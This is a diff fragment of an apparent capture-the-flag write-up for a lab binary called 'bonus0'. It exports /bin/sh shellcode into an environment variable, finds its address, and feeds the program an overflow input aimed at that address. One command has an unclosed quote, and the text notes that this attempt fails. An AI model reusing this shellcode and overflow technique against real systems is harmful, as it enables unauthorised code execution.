@@ -46,7 +46,7 @@ On the host:
 On the VM:
 ~$ export SCODE=$(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 ~$ /tmp/getenv SCODE
-SCODE @ 0xbffff7d0
+SCODE @ 0xbffff7d0 -> \xd0\xf7\xff\xbf
 ~$ python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xd0\xf7\xff\xbf' > /tmp/pb0; cat /tmp/pb0 - | ./bonus0
 # Oops, the second input needs to be bigger for the exploit to work
 # Let's try again:
